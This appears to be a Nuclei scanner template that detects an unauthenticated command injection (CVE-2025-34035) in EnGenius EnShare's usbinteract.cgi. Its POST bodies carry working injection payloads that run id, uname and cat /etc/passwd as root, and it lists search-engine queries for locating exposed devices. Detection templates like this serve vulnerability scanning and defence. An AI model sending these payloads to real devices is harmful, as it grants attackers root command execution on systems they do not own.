id: CVE-2025-34035

info:
  name: EnGenius EnShare Cloud Service Command Injection
  author: intelligent-ears
  severity: critical
  description: |
    EnGenius EnShare Cloud Service <= 1.4.11 contains an OS command injection vulnerability 
    caused by improper sanitization of user input in usbinteract.cgi path parameter, 
    allowing unauthenticated remote attackers to execute commands as root.
  reference:
    - https://cxsecurity.com/issue/WLB-2017060050
    - https://www.exploit-db.com/exploits/42114
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php
    - https://nvd.nist.gov/vuln/detail/CVE-2025-34035
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
    cvss-score: 10.0
    cve-id: CVE-2025-34035
    cwe-id: CWE-78
  metadata:
    verified: true
    shodan-query: 'http.title:"EnGenius" "EnShare" port:9000'
    fofa-query: 'title="EnGenius" && body="EnShare" && port="9000"'
  tags: cve,cve2025,engenius,enshare,rce,command-injection,kev

http:
  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"
      - "{{BaseURL}}/cgi-bin/usbinteract.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "{{Hostname}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: "action=7&path=\"|id||\""

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid=0(root)"
          - "gid=0(root)"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: user
        part: body
        regex:
          - "uid=([0-9]+)\\(([^)]+)\\)"
          - "gid=([0-9]+)\\(([^)]+)\\)"

  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"
      - "{{BaseURL}}/cgi-bin/usbinteract.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "{{Hostname}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: "action=7&path=\"|uname -a||\""

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Linux"
          - "mips"

      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"
      - "{{BaseURL}}/cgi-bin/usbinteract.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "{{Hostname}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: "action=7&path=\"|cat /etc/passwd||\""

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "root:"
          - "admin:"

      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"
      - "{{BaseURL}}/cgi-bin/usbinteract.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "{{Hostname}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: "action=7&path=\"|echo 'CVE-2025-34035-VALIDATION'||\""

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "CVE-2025-34035-VALIDATION"

      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinfo.cgi"
      - "{{BaseURL}}/cgi-bin/usbinfo.cgi"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    matchers:
      - type: word
        part: body
        words:
          - "EnGenius"
          - "EnShare"
          - "version"
